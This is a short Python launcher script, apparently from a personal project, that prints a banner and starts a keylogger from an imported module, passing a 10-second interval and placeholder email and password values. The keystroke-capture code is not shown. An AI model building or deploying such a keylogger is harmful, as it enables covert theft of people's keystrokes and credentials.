#!/usr/bin/env python 

#################################################################
#email:-    nikhilkumaraur8241@gmail.com                        #
#linkedin:- https://www.linkedin.com/in/nikhil-kumar-4b8497271/ #
# github:-  https://github.com/NikhilVKumar                     #
#################################################################
import keylogger
from termcolor import colored
logo="""         __                    
|_/ _   |  \ _ |_ _  _ |_o   _ 
| \(-`\/|__/(-`|_(-`(_ |_|\/(-`
      /       Tools by Nikhil Kumar ᵥ.₀₁                 
"""
print(colored(logo,'red'))


KD_keylogger = keylogger.Keylogger(10,"email","password")
KD_keylogger.start()